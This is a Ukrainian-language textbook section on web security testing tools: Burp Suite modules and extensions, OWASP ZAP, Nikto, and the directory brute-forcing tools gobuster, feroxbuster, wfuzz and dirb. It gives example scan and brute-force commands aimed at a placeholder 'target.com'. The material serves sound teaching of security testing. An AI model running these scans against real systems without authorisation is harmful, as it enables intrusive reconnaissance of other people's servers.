7.8 Інструменти тестування веб-безпеки

Тестування безпеки веб-додатків потребує спеціалізованих інструментів для перехоплення, аналізу та модифікації HTTP-трафіку, автоматичного сканування вразливостей та ручного тестування.

Burp Suite (PortSwigger)

Burp Suite — провідна платформа для тестування безпеки веб-додатків, розроблена PortSwigger (засновник: Dafydd Stuttard, автор "The Web Application Hacker's Handbook").

Редакція Ціна Ключові можливості
Community Безкоштовно Proxy, Repeater, Decoder, Comparer, Sequencer (без Scanner)
Professional $449/рік Повний Scanner, необмежений Intruder, BApp Store, Collaborator
Enterprise Від $8,395/рік CI/CD інтеграція, scheduled scans, multi-user, RBAC

Модулі Burp Suite

  • Proxy: перехоплення та модифікація HTTP/HTTPS у реальному часі. Для HTTPS встановити CA-сертифікат Burp (http://burp/cert). WebSocket підтримується
  • Scanner (Pro): автоматичне виявлення SQLi, XSS, XXE, SSRF тощо. Passive + Active scan
  • Intruder: автоматизовані атаки. Типи:
    • Sniper: один payload set, кожна позиція окремо
    • Battering Ram: один payload, всі позиції одночасно
    • Pitchfork: паралельні payload sets (1:1)
    • Cluster Bomb: всі комбінації (декартовий добуток)
  • Repeater: ручна відправка та модифікація HTTP-запитів, основний інструмент для PoC
  • Decoder: Base64, URL, HTML entities, Hex, Gzip, ASCII Hex
  • Comparer: diff двох відповідей — корисно для blind vulnerabilities
  • Sequencer: статистичний аналіз випадковості токенів та session ID

Розширення Burp Suite (BApp Store)

Розширення Призначення
Autorize Автоматичне тестування контролю доступу — повторює запити з іншим токеном
Logger++ Розширене логування з фільтрацією та пошуком
JWT Editor Перегляд, редагування та атаки на JWT-токени
Active Scan++ Додаткові перевірки: host header injection, cache poisoning
Param Miner Виявлення прихованих параметрів та заголовків
Turbo Intruder Високошвидкісний Intruder, Python-скрипти, race conditions
Hackvertor Розширене кодування/декодування з тегами

OWASP ZAP (Zed Attack Proxy)

OWASP ZAP — безкоштовний open-source проксі. Кросплатформний (Java). Ідеальний для початківців та CI/CD.

  • Spider: автоматичне обходження сайту. Traditional Spider + AJAX Spider (для SPA)
  • Passive Scan: аналіз трафіку без модифікації — missing headers, info disclosure
  • Active Scan: активне тестування параметрів (SQLi, XSS, path traversal)
  • Fuzzer: параметрний фазинг з вбудованими wordlists
  • HUD: Heads Up Display — overlay у браузері для інтерактивного тестування
  • REST API: повне керування через API для автоматизації
  • Docker: офіційний образ для CI/CD інтеграції
# ZAP у CI/CD (Docker)
# Baseline scan (passive only, швидкий)
docker run -t zaproxy/zap-stable zap-baseline.py -t https://target.com

# Full scan (passive + active)
docker run -t zaproxy/zap-stable zap-full-scan.py -t https://target.com

# API scan (OpenAPI/Swagger)
docker run -t zaproxy/zap-stable zap-api-scan.py \
  -t https://target.com/api/v1/openapi.json -f openapi

Nikto

Nikto — open-source сканер веб-серверів. 6,700+ перевірок: застарілі версії, небезпечні файли, default credentials, misconfigurations.

# Базове сканування
nikto -h https://target.com

# Конкретний порт, збереження результатів
nikto -h target.com -p 8443 -o report.html -Format htm

# Через proxy (Burp)
nikto -h target.com -useproxy http://127.0.0.1:8080

Directory Brute-Forcing

Пошук прихованих директорій, файлів та endpoint'ів:

# gobuster — швидкий Go-based інструмент
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt -t 50

# gobuster modes: dir, dns, vhost, fuzz

# feroxbuster — рекурсивний content discovery (Rust)
feroxbuster -u https://target.com -w wordlist.txt --depth 3 --threads 50

# wfuzz — гнучкий fuzzer
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt \
  --hc 404 https://target.com/FUZZ

# dirb — класичний інструмент
dirb https://target.com /usr/share/dirb/wordlists/common.txt

Browser DevTools

Вбудовані інструменти розробника (F12) — незамінні для тестування:

  • Network: HTTP-запити/відповіді, headers, timing. Фільтрація за типом (XHR, JS)
  • Console: виконання JavaScript, перегляд помилок, тестування XSS
  • Application: cookies, localStorage, sessionStorage. Перегляд і модифікація
  • Sources: вихідний код JavaScript, breakpoints, debugging
  • Elements: DOM-дерево, inline editing, пошук прихованих полів форм
